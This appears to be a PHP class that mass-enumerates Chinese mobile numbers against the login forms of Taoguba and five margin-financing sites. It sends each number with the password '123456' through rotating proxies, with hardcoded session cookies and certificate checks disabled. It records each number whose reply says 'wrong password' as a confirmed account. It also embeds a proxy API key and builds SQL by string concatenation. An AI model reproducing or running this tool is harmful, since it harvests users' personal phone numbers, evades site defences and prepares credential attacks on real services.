<?php
/**
 * Created by PhpStorm.
 * User: b_tt
 * Date: 19/1/28
 * Time: 10:37
 */

namespace common\utils;


use common\models\Log;

class TryPhone
{
	const APP_KEY = 'af295cc800a749b5bc66ddd07952cfee';
//	const URL_GET_IPS = 'http://piping.mogumiao.com/proxy/api/get_ip_bs?appKey=405b848e01284a42a1b2152b48973894&count=10&expiryDate=0&format=1&newLine=2';
	const URL_GET_IPS = 'http://mvip.piping.mogumiao.com/proxy/api/get_ip_bs?appKey=af295cc800a749b5bc66ddd07952cfee&count=7&expiryDate=0&format=1&newLine=2';

	const LOCAL_IP = '139.199.31.56';

	const URL_TAOGUBA_LOGIN = 'https://sso.taoguba.com.cn/web/login/submit';
	const COOKIE = 'Hm_lvt_cc6a63a887a7d811c92b7cc41c441837=1548320523; UM_distinctid=1687f18470f485-00955950e23854-10346656-fa000-1687f184711b32; CNZZDATA1574657=cnzz_eid%3D2073132248-1548319611-https%253A%252F%252Fwww.taoguba.com.cn%252F%26ntime%3D1548319611; JSESSIONID=d82ef175-fd60-46a4-9c4d-494d410475ef; Hm_lpvt_cc6a63a887a7d811c92b7cc41c441837=1548320768';

	const CAT_TAOGUBA = "taoguba";
	const CAT_YIHAOPZ = "yiHaoPZ";
	const CAT_WOLUNCL = "woLunCL";
	const CAT_QIANCHENGCL = "qianChengCL";
	const CAT_HONGDASP = "hongDaSP";
	const CAT_SHUNFAPZ = "shunFaPZ";
	static $catDict = [
		self::CAT_TAOGUBA => '淘股吧',
		self::CAT_YIHAOPZ => '一号配资',
		self::CAT_WOLUNCL => '沃伦策略',
		self::CAT_QIANCHENGCL => '钱程策略',
		self::CAT_HONGDASP => '弘大速配',
		self::CAT_SHUNFAPZ => '顺发配资',
	];

	// 把每天抓取到的手机号存入数据库
	public static function put_logs_to_db($dt, $area = self::CAT_TAOGUBA)
	{
		// $dt => phone_yes20190217.log
		// $dt => phone_yesqianChengCL_20190219.log
		$filepath = "/data/logs/imei/phone_yes" . $dt . ".log";
		if (!file_exists($filepath)) {
			return false;
		}
		$logs = @file_get_contents($filepath);
		if (!$logs) {
			return false;
		}
		$logs = explode("\n", $logs);
		if (!$logs) {
			return false;
		}
		foreach ($logs as $log) {
			if ($log) {
				$date = substr($log, 0, 19);
				$phone = substr($log, -12, 11);
				Log::add_phone_section_yes($phone, $date, $area);
			}
		}
		return true;
	}

	/**
	 * 原文：https://blog.csdn.net/u013091013/article/details/81312559
	 */
	public static function updateIPs()
	{
		$link = self::URL_GET_IPS;
		$ret = AppUtil::httpGet($link);
		$ret = json_decode($ret, 1);
		//print_r($ret);
		$ip_port = [];
		if (is_array($ret) && $ret['code'] == 0) {
			foreach ($ret['msg'] as $v) {
				$ip_port[] = $v['ip'] . ":" . $v['port'];
			}
		}

		RedisUtil::init(RedisUtil::KEY_PROXY_IPS, self::LOCAL_IP)->setCache($ip_port);

	}

	public static function get_proxy_ip()
	{
		$ret = RedisUtil::init(RedisUtil::KEY_PROXY_IPS, self::LOCAL_IP)->getCache();
		$ret = json_decode($ret, 1);
		if (is_array($ret)) {
			shuffle($ret);
			return $ret[0];
		}
		return "";
	}

	public static function logFile($msg, $funcName = '', $line = '', $filename = "try_phone")
	{
		if (is_array($msg)) {
			$msg = json_encode($msg, JSON_UNESCAPED_UNICODE);
		}
		if ($funcName) {
			$msg = $funcName . ' ' . $line . ': ' . $msg;
		} else {
			$msg = 'message: ' . $msg;
		}
		$fileName = AppUtil::logDir() . 'phone_' . $filename . date('Ymd') . '.log';
		@file_put_contents($fileName, date('Y-m-d H:i:s') . ' ' . $msg . PHP_EOL, FILE_APPEND);
	}

	public static function get_link($cat)
	{
		if ($cat == self::CAT_TAOGUBA) {
			$link = 'https://sso.taoguba.com.cn/web/login/submit';
		} elseif ($cat == self::CAT_YIHAOPZ) {
			$link = 'https://www.yhpz.com/common/Pub/dologin';
		} elseif ($cat == self::CAT_WOLUNCL) {
			$link = 'https://www.iwolun.com/loginI';
		} elseif ($cat == self::CAT_QIANCHENGCL) {
			$link = 'https://www.58moneys.com/home/index/login';
		} elseif ($cat == self::CAT_HONGDASP) {
			$link = 'http://www.stianran.com/index.php?ctl=user&act=dologin&ajax=1';
		} elseif ($cat == self::CAT_SHUNFAPZ) {
			$link = 'http://www.pz79.com/index.php?app=web&mod=member&ac=dologin';
		} else {
			$link = '';
		}
		return $link;
	}

	public static function get_cookie($cat)
	{
		if ($cat == self::CAT_TAOGUBA) {
			$cookie = 'Hm_lvt_cc6a63a887a7d811c92b7cc41c441837=1548320523; UM_distinctid=1687f18470f485-00955950e23854-10346656-fa000-1687f184711b32; CNZZDATA1574657=cnzz_eid%3D2073132248-1548319611-https%253A%252F%252Fwww.taoguba.com.cn%252F%26ntime%3D1548319611; JSESSIONID=d82ef175-fd60-46a4-9c4d-494d410475ef; Hm_lpvt_cc6a63a887a7d811c92b7cc41c441837=1548320768';
		} elseif ($cat == self::CAT_YIHAOPZ) {
			$cookie = "__cfduid=d8b65d9189e6a534c59b8d957e7be305d1550109951; PHPSESSID=o1tkeqpc5f0s6jio5flkma5vf7; LiveWSPGT34891992=d5727885b97e419fb7213b56f3d658a2; LiveWSPGT34891992sessionid=d5727885b97e419fb7213b56f3d658a2; NPGT34891992fistvisitetime=1550109953524; NPGT34891992visitecounts=1; NPGT34891992lastvisitetime=1550110152141; NPGT34891992visitepages=6";
		} elseif ($cat == self::CAT_WOLUNCL) {
			$cookie = 'SESSION=6c6408a8-a14e-4b3d-9cb2-222557f00d16; Hm_lvt_d052aa2efa971ba1bdb0ea7178efe2a6=1550199764; Hm_lpvt_d052aa2efa971ba1bdb0ea7178efe2a6=1550199764; __root_domain_v=.iwolun.com; _qddaz=QD.rqpe7s.mfcqef.js5gwxhm; _qdda=3-1.32tw1c; _qddab=3-h3iuru.js5gwxk2; _qddamta_2852159076=3-0';
		} elseif ($cat == self::CAT_QIANCHENGCL) {
			$cookie = 'PHPSESSID=iq7sju7a0p3s51stkp39lo9783; __utma=156655551.450832559.1550200096.1550200096.1550200096.1; __utmc=156655551; __utmz=156655551.1550200096.1.1.utmcsr=mail.hichina.com|utmccn=(referral)|utmcmd=referral|utmcct=/static/blank.html';
		} elseif ($cat == self::CAT_HONGDASP) {
			$cookie = 'security_session_verify=e43a676ed6712bf46bf830173e93f710; ZDEDebuggerPresent=php,phtml,php3; PHPSESSID=ku08r19baqa7ohja5gupuielq7; cck_lasttime=1550200521916; cck_count=0; __51cke__=; firstEnterUrlInSession=http%3A//www.stianran.com/; ktime_vip/535c3814-de54-5901-8b23-da745236f387/1b93f3fd-d178-4bb3-b425-181c7567d49e=-3; k_vip/535c3814-de54-5901-8b23-da745236f387/1b93f3fd-d178-4bb3-b425-181c7567d49e=y; VisitorCapacity=1; __tins__19684689=%7B%22sid%22%3A%201550219128389%2C%20%22vd%22%3A%201%2C%20%22expires%22%3A%201550220928389%7D; __51laig__=3';
		} elseif ($cat == self::CAT_SHUNFAPZ) {
			$cookie = 'aliyungf_tc=AQAAABYuImjPSQoAP6GHPew/L5aeLaZd; PHPSESSID=02r9tjuv09kde4j98clhoakqs7; cck_lasttime=1550199838384; cck_count=0; CCKF_visitor_id_140348=1163261272; cckf_track_140348_LastActiveTime=1550221007; cckf_track_140348_AutoInviteNumber=0; cckf_track_140348_ManualInviteNumber=0';
		} else {
			$cookie = '';
		}
		return $cookie;
	}

	public static function process_ret($ret, $field)
	{
		$ret = AppUtil::json_decode($ret);
		$ret[$field] = self::unicodeDecode($ret[$field]);
		return AppUtil::json_encode($ret);
	}

	public static function unicodeDecode($unicode_str)
	{
		$json = '{"str":"' . $unicode_str . '"}';
		$arr = json_decode($json, true);
		if (empty($arr)) return '';
		return $arr['str'];
	}

	public static function pre_reqData($phone, $cat)
	{
		$ret = "";
		switch ($cat) {
			case self::CAT_TAOGUBA:
				$data = [
					'userName' => $phone,
					'password' => "123456",
					'save' => "Y",
					'url' => "https://www.taoguba.com.cn/index?blockID=1",
				];
				$header = [
					'Accept:*/*',
					'accept-encoding: gzip, deflate, br',
					'accept-language: zh-CN,zh;q=0.9,en;q=0.8',
					'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
					//'Content-Length: 100',
					//"Proxy-Authorization: {$appKey}",
					"User-Agent:Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.13) Gecko/20080311 Firefox/2.1.0.13",
					'origin: https://sso.taoguba.com.cn',
					'Referer: https://sso.taoguba.com.cn/xdomainProxy.html',
					'X-Requested-With: XMLHttpRequest',
				];
//				$ret = self::reqData($data, $cat, $header, 1);
				$ret = self::taoguba_phone($data);
				break;
			case self::CAT_YIHAOPZ:
				$data = [
					'mobile' => $phone,
					'password' => "123456",
					'verifycode' => "5853",
				];
				$header = [
					'Accept:application/json, text/javascript, */*; q=0.01',
					'accept-encoding: gzip, deflate, br',
					'accept-language: zh-CN,zh;q=0.9,en;q=0.8',
					'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
					'Content-Length: 50',
					"User-Agent:Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36",
					'origin: https://www.yhpz.com',
					'Referer: https://www.yhpz.com/home/Member/login',
					'X-Requested-With: XMLHttpRequest',
				];
				$ret = self::reqData($data, $cat, $header, 0, 'gzip');
				break;
			case self::CAT_SHUNFAPZ:
				$data = [
					'username' => $phone,
					'password' => "123456",
					'authcode' => "",
					'from' => "/index.php?app=web&mod=user&ac=account",
				];
				$header = [
					'Accept:application/json, text/javascript, */*; q=0.01',
					'accept-encoding: gzip, deflate',
					'accept-language: zh-CN,zh;q=0.9,en;q=0.8',
					'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
					'Content-Length: 50',
					"User-Agent:Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36",
					'host: www.pz79.com',
					'origin: https://www.pz79.com',
					'Referer: http://www.pz79.com/index.php?app=web&mod=memb',
					'X-Requested-With: XMLHttpRequest',
				];
				$ret = self::reqData($data, $cat, $header, 0, 'gzip');
				$ret = self::process_ret($ret, 'msg');
				break;
			case self::CAT_WOLUNCL:
				$data = [
					'mobile' => $phone,
					'password' => "123456",
				];
				$header = [
					'Accept: */*',
					'accept-encoding: gzip, deflate, br',
					'accept-language: zh-CN,zh;q=0.9,en;q=0.8',
					'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
					'Content-Length: 33',
					"User-Agent:Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36",
					'origin: https://www.iwolun.com',
					'Referer: https://www.iwolun.com/',
					'X-Requested-With: XMLHttpRequest',
				];
				$ret = self::reqData($data, $cat, $header, 0, 'gzip');
				break;
			case self::CAT_QIANCHENGCL:
				$data = [
					'username' => $phone,
					'pwd' => "123456",
					'code' => "1",
				];
				$header = [
					'Accept: */*',
					'accept-encoding: gzip, deflate, br',
					'accept-language: zh-CN,zh;q=0.9,en;q=0.8',
					'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
					'Content-Length: 38',
					"User-Agent:Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36",
					'host: www.58moneys.com',
					'origin: https://www.58moneys.com',
					'Referer: https://www.58moneys.com/',
					'X-Requested-With: XMLHttpRequest',
				];
				$ret = self::reqData($data, $cat, $header);
				$ret = self::process_ret($ret, 'msg');
				break;
			case self::CAT_HONGDASP:
				$data = [
					'email' => $phone,
					'user_pwd' => "123456",
				];
				$header = [
					'Accept: */*',
					'accept-encoding: gzip, deflate',
					'accept-language: zh-CN,zh;q=0.9,en;q=0.8',
					'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
					'Content-Length: 33',
					"User-Agent:Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36",
					'host: www.stianran.com',
					'origin: http://www.stianran.com',
					'Referer: http://www.stianran.com/',
					'X-Requested-With: XMLHttpRequest',
				];
				$ret = self::reqData($data, $cat, $header);
				$ret = self::process_ret($ret, 'info');
				break;
		}

		self::logFile(['phone' => $phone, 'ret' => $ret], __FUNCTION__, __LINE__, 'logs_' . $cat . '_');

		self::request_after($ret, $phone, $cat);
	}

	public static function reqData($data, $cat, $header = [], $proxy = 0, $encoding = 0)
	{

		$link = self::get_link($cat);

		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, $link);//设置链接
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		if ($proxy) {
			$ip_port = self::get_proxy_ip();
			self::logFile(__FUNCTION__ . ' $ip_port=>' . $ip_port, __FUNCTION__, __LINE__);
			if (!$ip_port) {
				curl_close($ch);
				return false;
			}
			$arrip = explode(":", $ip_port);
			$appKey = "Basic" . self::APP_KEY;

			curl_setopt($ch, CURLOPT_PROXYAUTH, CURLAUTH_BASIC); //代理认证模式
			curl_setopt($ch, CURLOPT_PROXY, $arrip[0]); //代理服务器地址
			curl_setopt($ch, CURLOPT_PROXYPORT, $arrip[1]); //代理服务器端口
			curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
			$header[] = "Proxy-Authorization: {$appKey}";
			//$header[] = 'Content-Length: ' . strlen($postdata);
			$header[] = 'Content-Length: 100';
		}
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE); // https请求 不验证证书和hosts
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
		curl_setopt($ch, CURLOPT_TIMEOUT, 30);//设置超时时间
		curl_setopt($ch, CURLOPT_COOKIE, self::get_cookie($cat));

		curl_setopt($ch, CURLOPT_POST, 1);
		$postdata = "";
		foreach ($data as $key => $value) {
			$postdata .= ($key . '=' . $value . '&');
		}
		curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);

		curl_setopt($ch, CURLOPT_HTTPHEADER, $header);

		if ($encoding) {
			curl_setopt($ch, CURLOPT_ENCODING, $encoding);// 对返回数据进行解压
		}


		$response = curl_exec($ch);
		if ($response === false) {
			$error_info = curl_error($ch);
			curl_close($ch);// 关闭curl
			return false;
		} else {
			curl_close($ch);//关闭 curl
			$response = AppUtil::check_encode($response);
			return $response;
		}
	}

	public static function taoguba_phone($data)
	{
		$ip_port = self::get_proxy_ip();
		self::logFile(__FUNCTION__ . '$ip_port=>' . $ip_port, __FUNCTION__, __LINE__);
		if (!$ip_port) {
			return false;
		}
		$arrip = explode(":", $ip_port);
		$appKey = "Basic" . self::APP_KEY;

		$link = self::URL_TAOGUBA_LOGIN;

		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, $link);//设置链接
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_PROXYAUTH, CURLAUTH_BASIC); //代理认证模式
		curl_setopt($ch, CURLOPT_PROXY, $arrip[0]); //代理服务器地址
		curl_setopt($ch, CURLOPT_PROXYPORT, $arrip[1]); //代理服务器端口
		curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE); // https请求 不验证证书和hosts
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
		curl_setopt($ch, CURLOPT_TIMEOUT, 30);//设置超时时间
		curl_setopt($ch, CURLOPT_COOKIE, self::COOKIE);

		curl_setopt($ch, CURLOPT_POST, 1);
		$postdata = "";
		foreach ($data as $key => $value) {
			$postdata .= ($key . '=' . $value . '&');
		}
		curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
		curl_setopt($ch, CURLOPT_HTTPHEADER,
			[
				'Accept:*/*',
				'accept-encoding: gzip, deflate, br',
				'accept-language: zh-CN,zh;q=0.9,en;q=0.8',
				'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
				'Content-Length: ' . strlen($postdata),
				"Proxy-Authorization: {$appKey}",
				"User-Agent:Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.13) Gecko/20080311 Firefox/2.1.0.13",
				'origin: https://sso.taoguba.com.cn',
				'Referer: https://sso.taoguba.com.cn/xdomainProxy.html',
				'X-Requested-With: XMLHttpRequest',
			]);

		$response = curl_exec($ch);
		if ($response === false) {
			$error_info = curl_error($ch);
			curl_close($ch);// 关闭curl
			return false;
		} else {
			curl_close($ch);//关闭 curl
			return $response;
		}
	}

	public static function phone_section_base($index = 1)
	{
		while (1) {
			$log = Log::findOne(['oCategory' => Log::CAT_PHONE_SECTION, 'oKey' => Log::KEY_WAIT]);
			if ($log) {
				$p = $log->oOpenId;
				// echo $p . PHP_EOL;
				$log->oKey = Log::KEY_USED;
				$log->oAfter = $index;
				$log->save();
				self::combind_phone($p);
			} else {
				break;
			}
		}
	}

	public static function phone_section()
	{
		return AppUtil::db()->createCommand("select oOpenId from im_log where oCategory='phone_section' and oKey=1 order by oId asc limit 1 ")->queryOne();
	}

	// 淘股吧 bj
	public static function phone_section_1()
	{
		$phone_section = [
			//1561102,
			1391026, 1891113, 1861815, 1372004, 1851048, 1305191, 1381198, 1368365,
			1361119, 1330122, 1352129, 1371810, 1891133, 1851311, 1861174, 1891030, 1861192, 1504007, 1391183, 1861016,
			1391076, 1841028, 1369128, 1326033, 1850026, 1346666, 1367134, 1391018, 1891081, 1864641, 1380100, 1391141,
			1381050, 1860132, 1581004, 1381000, 1391104, 1891053, 1352194, 1851808, 1861264, 1861021, 1861838, 1340111,
			1326971, 5786511, 1581039, 1343970, 1800632, 1391122, 1326122, 1234567, 1331234, 1111111, 1333444, 1851074,
			1333119, 1590100, 1352018, 1346635, 1370110, 1871003, 1861163, 1391157, 1381102, 1358153, 1501143, 1731017,
			1336637, 1581129, 1312026, 1760038, 1368121, 1390120, 1567947, 1860003, 1570168, 1885695, 1850004, 1561546,
			1352182, 1331110, 1861259, 1360100, 1365137, 1851016, 1380102, 1771063, 1391080, 1358190, 1590125, 1860137,
			1761167, 1891094, 1391096, 1352423, 1851032, 1362138, 1312149, 1891102, 1381171,
		];
		$phone_section = self::phone_section();
		foreach ($phone_section as $p) {
			self::combind_phone($p, 1);
		}
	}

	// 淘股吧 tianjin shanghai
	public static function phone_section_2()
	{
		// select group_concat(oOpenId) from  im_log where oCategory='phone_section' and oBefore='tianjin' and oKey=1 group by oCategory order by oId asc limit 100;
		$phone_section = [
			//1375220,
			//1361208,
			1392069, 1351622, 1860226, 1512216, 1863099, 1552293, 1852236, 1592208,
			1351245, 1351281, 1351285, 1351286, 1351287,
			1303225, 1863090, 1351222, 1351225, 1862252, 1351226,
			1832119, 1734976, 1366301, 1368179, 1590214, 1381641, 1521037, 1361164, 1500188, 1381643, 1590086,
			1500045, 1502673, 1502131, 1502155, 1522134, 1580195, 1390146, 1582164, 1582196, 1358554, 1361161, 1364182, 1391749
		];
		$phone_section = self::phone_section();
		foreach ($phone_section as $p) {
			self::combind_phone($p, 2);
		}
	}

	// 一号配资
	public static function phone_section_7()
	{
		$phone_section = [
			1825157, 1395925, 1874207, 1881145, 1521009, 1551069, 1863116, 1397886, 1581156, 1511795,
			1820103, 1836611, 1880123, 1551025, 1851580, 1862845, 1771838, 1880013, 1891080, 1881315, 1352235,
			1590291, 1350105, 1380121, 1860044, 1761162, 1537301, 1368127, 1369699,
		];
		foreach ($phone_section as $p) {
			self::combind_phone_new2($p, 6, self::CAT_YIHAOPZ);
		}
	}

	// 沃伦策略
	public static function phone_section_8()
	{
		$phone_section = [
			1825157, 1395925, 1874207, 1881145, 1521009, 1551069, 1863116, 1397886, 1581156, 1511795,
			1820103, 1836611, 1880123, 1551025, 1851580, 1862845, 1771838, 1880013, 1891080, 1881315, 1352235,
			1590291, 1350105, 1380121, 1860044, 1761162, 1537301, 1368127, 1369699,
		];
		foreach ($phone_section as $p) {
			self::combind_phone_new2($p, 8, self::CAT_WOLUNCL);
		}
	}

	// 钱程策略
	public static function phone_section_9()
	{
		$phone_section = [
//			1825157, 1395925, 1874207, 1881145, 1521009, 1551069, 1863116, 1397886, 1581156, 1511795,
//			1820103, 1836611, 1880123, 1551025, 1851580, 1862845, 1771838, 1880013, 1891080, 1881315, 1352235,
//			1590291, 1350105, 1380121, 1860044, 1761162, 1537301, 1368127, 1369699,

			1364174,
			1378898,
			1831708,
			1381622,
			1502116,
			1351200,
			1350218,
			1350214,
			1350212,
			1862211,
			1391083,
			1371648,
			1819342,
			1827717,
			1571282,
			1851365,
			1362115,
			1561102,
			1391026,
			1891113,
			1861815,
			1372004,
			1851048,
			1305191,
			1381198,
			1368365,
			1361119,
			1330122,
			1352129,
			1371810,
			1891133,
			1851311,
			1861174,
			1891030,
			1861192,
			1504007,
			1391183,
			1861016,
			1391076,
			1841028,
			1369128,
			1326033,
			1850026,
			1346666,
			1367134,
			1391018,
			1891081,
			1864641,
			1380100,
			1391141,
			1381050,
			1860132,
			1581004,
			1381000,
			1391104,
			1891053,
			1352194,
			1851808,
			1861264,
			1861021,
			1861838,
			1340111,
			1326971,
			5786511,
			1581039,
			1343970,
			1800632,
			1391122,
			1326122,
			1234567,
			1331234,
			1111111,
			1333444,
			1851074,
			1333119,
			1590100,
			1352018,
			1346635,
			1370110,
			1871003,
			1861163,
			1391157,
			1381102,
			1358153,
			1501143,
			1731017,
			1336637,
			1581129,
			1312026,
			1760038,
			1368121,
			1390120,
			1567947,
			1860003,
			1570168,
			1885695,
			1850004,
			1561546,
			1352182,
			1331110,
			1861259,
			1360100,
			1365137,
			1851016,
			1380102,
			1771063,
			1391080,
			1358190,
			1590125,
			1860137,
			1761167,
			1891094,
			1391096,
			1352423,
			1851032,
			1362138,
			1312149,
			1891102,
			1381171,
			1861811,
			1891038,
			1864584,
			1830115,
			1581014,
			1352017,
			1504138,
			1851929,
			1352622,
			1852225,
			1331203,
			1320758,
			1355244,
			1781023,
			1862221,
			1551095,
			1382122,
			1586609,
			1372238,
			1382129,
			1892027,
			1860229,
			1862271,
			1382127,
			1382062,
			1522226,
			1592202,
			1872221,
			1382031,
			1302135,
			1362218,
			1502258,
			1502239,
			1392041,
			1375220,
			1361208,
			1392069,
			1351622,
			1860226,
			1512216,
			1863099,
			1552293,
			1852236,
			1592208,
			1317663,
			1382185,
			1760269,
			1301283,
			1391775,
			1592125,
			1586584,
			1891830,
			1590211,
			1862181,
			1377026,
			1335798,
			1368166,
			1348281,
			1893083,
			1582113,
			1365637,
			1302068,
			1505373,
			1337111,
			1500025,
			1821717,
			1390188,
			1522150,
			1770511,
			1836115,
			1592197,
			1980117,
			1821004,
			1877210,
			1390451,
			1810139,
			1761073,
			1821049,
			1305162,
			1521054,
			1391156,
			1520124,
			1520123,
			1345624,
			1471811,
			1882045,
			1868725,
			1768956,
			1569434,
			1369305,
			1390132,
			1362124,
			1305155,
			1501135,
			1522687,
			1769986,
			1599421,
			1307010,
			1591068,
			1563375,
			1366135,
			1731045,
			1325272,
			1821039,
			1532125,
			1820155,
			1551078,
			1861001,
			1391075,
			1521099,
			1532137,
			1328776,
			1880139,
			1332118,
			1326988,
			1500116,
			1718866,
			1357348,
			1516116,
			1596320,
			1567948,
			1326112,
			1564037,
			1886297,
			1360572,
			1362268,
			1375064,
			1361862,
			1526727,
			1595217,
			1598735,
			1599076,
			1378076,
			1871106,
			1870142,
			1347104,
			1347861,
			1890931,
			1363415,
			1363140,
			1363152,
			1361085,
			1361281,
			1360345,
			1366147,
			1366762,
			1366386,
			1368314,
			1367211,
			1368350,
			1368805,
			1320503,
			1760815,
			1371459,
			1370817,
			1370436,
			1370748,
			1369126,
			1375717,
			1376339,
			1376108,
			1375181,
			1371805,
			1371772,
			1371890,
			1663065,
			1881070,
			1369328,
			1352103,
			1381008,
			1369324,
			1811791,
			1570728,
			1391041,
			1501080,
			1329298,
			1511019,
			1860005,
			1583527,
			1370108,
			1780018,
			1511792,
			1370120,
			1570688,
			1770705,
			1880469,
			1391684,
			1867464,
			1383324,
			1392942,
			1872817,
			1570164,
			1390513,
			1800090,
			1532132,
			1357279,
			1531511,
			1338115,
			1808169,
			1663000,
			1537677,
			1328205,
			1831068,
			1386757,
			1571006,
			1891547,
			1776529,
			1595954,
			1337801,
			1662125,
			1594756,
			1592010,
			1507162,
			1591739,
			1851905,
			1375487,
			1395625,
			1596756,
			1362185,
			1869161,
			1508423,
			1887429,
			1360845,
			1505463,
			1505151,
			1368999,
			1814023,
			1503747,
			1341066,
			1320273,
			1377642,
			1526884,
			1881591,
			1353503,
			1351726,
			1598881,
			1502331,
			1805242,
			1582298,
			1343684,
			1360108,
			1783559,
			1590152,
			1551035,
			1381194,
			1343962,
			1867898,
			1391029,
			1555796,
			1520637,
			1391050,
			1371466,
			1331526,
			1786862,
			1833485,
			1358200,
			1352036,
			1860064,
			1381108,
			1366120,
			1591087,
			1591076,
			1820162,
			1830130,
			1850021,
			1861131,
			1381002,
			1509072,
			1570733,
			1839660,
			1348531,
			1520077,
			1531125,
			1761447,
			1350809,
			1852448,
			1386017,
			1773109,
			1555817,
			1367927,
			1330581,
			1776109,
			1835755,
			1509035,
			1398050,
			1394728,
			1342847,
			1387369,
			1857005,
			1516627,
			1332485,
			1580728,
			1390227,
			1310728,
			1340265,
			1382220,
			1303225,
			1863090,
			1351222,
			1351225,
			1862252,
			1351226,
			1351228,
			1351241,
			1351243,
			1351245,
			1351281,
			1351285,
			1351286,
			1351287,
			1832119,
			1734976,
			1366301,
			1368179,
			1590214,
			1381641,
			1521037,
			1361164,
			1500188,
			1381643,
			1590086,
			1391836,
			1391844,
			1500092,
			1500045,
			1502673,
			1502131,
			1502155,
			1522134,
			1580195,
			1390146,
			1582164,
			1582196,
			1358554,
			1361161,
			1364182,
			1391749,
		];
		foreach ($phone_section as $p) {
			self::combind_phone_new2($p, 9, self::CAT_QIANCHENGCL);
		}
	}

	// 弘大速配
	public static function phone_section_10()
	{
		$phone_section = [
			1825157, 1395925, 1874207, 1881145, 1521009, 1551069, 1863116, 1397886, 1581156, 1511795,
			1820103, 1836611, 1880123, 1551025, 1851580, 1862845, 1771838, 1880013, 1891080, 1881315, 1352235,
			1590291, 1350105, 1380121, 1860044, 1761162, 1537301, 1368127, 1369699,
		];
		foreach ($phone_section as $p) {
			self::combind_phone_new2($p, 9, self::CAT_HONGDASP);
		}
	}

	// 顺发配资
	public static function phone_section_11()
	{
		$phone_section = [
			1825157, 1395925, 1874207, 1881145, 1521009, 1551069, 1863116, 1397886, 1581156, 1511795,
			1820103, 1836611, 1880123, 1551025, 1851580, 1862845, 1771838, 1880013, 1891080, 1881315, 1352235,
			1590291, 1350105, 1380121, 1860044, 1761162, 1537301, 1368127, 1369699,
		];
		foreach ($phone_section as $p) {
			self::combind_phone_new2($p, 9, self::CAT_SHUNFAPZ);
		}
	}


	public static function combind_phone($p, $Index = 1)
	{
		$sql = "update im_log set oKey=9,oAfter=$Index where `oCategory`='phone_section' and oOpenId =$p";
		AppUtil::db()->createCommand($sql)->execute();
		for ($i = 0; $i < 9999; $i++) {
			$phone = $p * 10000 + $i;
			self::req($phone);
		}
	}

	public static function combind_phone_new2($p, $Index = 1, $cat)
	{
		if ($cat == self::CAT_TAOGUBA) {
			$sql = "update im_log set oKey=9,oAfter=$Index where `oCategory`='phone_section' and oOpenId =$p";
			AppUtil::db()->createCommand($sql)->execute();
		}
		for ($i = 0; $i < 9999; $i++) {
			$phone = $p * 10000 + $i;
			self::pre_reqData($phone, $cat);
		}
	}

	public static function req($phone)
	{
		$data = [
			'userName' => $phone,
			'password' => "123456",
			'save' => "Y",
			'url' => "https://www.taoguba.com.cn/index?blockID=1",
		];
		$ret = TryPhone::taoguba_phone($data);
		// echo $phone . ' ===== ' . $ret . PHP_EOL;
		self::logFile(['phone' => $phone, 'ret' => $ret], __FUNCTION__, __LINE__, 'logs');
		if ($ret) {
			$ret = json_decode($ret, 1);
			if (isset($ret['errorMessage']) && $ret['errorMessage'] == "密码错误") {
				self::logFile(['phone' => $phone], __FUNCTION__, __LINE__, 'yes');
			}
		}
	}

	public static function request_after($ret, $phone, $cat)
	{
		if (!$ret) {
			return;
		}
		$yes_filename = 'yes' . $cat . '_';
		$field = $tip = '';
		$ret = json_decode($ret, 1);
		switch ($cat) {
			case self::CAT_TAOGUBA:
				$field = "errorMessage";
				$tip = "密码错误";
				break;
			case self::CAT_YIHAOPZ:
			case self::CAT_SHUNFAPZ:
				$field = "msg";
				$tip = "密码错误";
				break;
			case self::CAT_WOLUNCL:
				$field = "message";
				$tip = "登录失败:用户名或密码错误";
				break;
			case self::CAT_QIANCHENGCL:
				$field = "msg";
				$tip = "帐号或者密码错误";
				break;
			case self::CAT_HONGDASP:
				$field = "info";
				$tip = "密码错误";
				break;
		}

		if ($field && isset($ret[$field]) && $ret[$field] == $tip) {
			self::logFile(['phone' => $phone], __FUNCTION__, __LINE__, $yes_filename);
		}

	}
}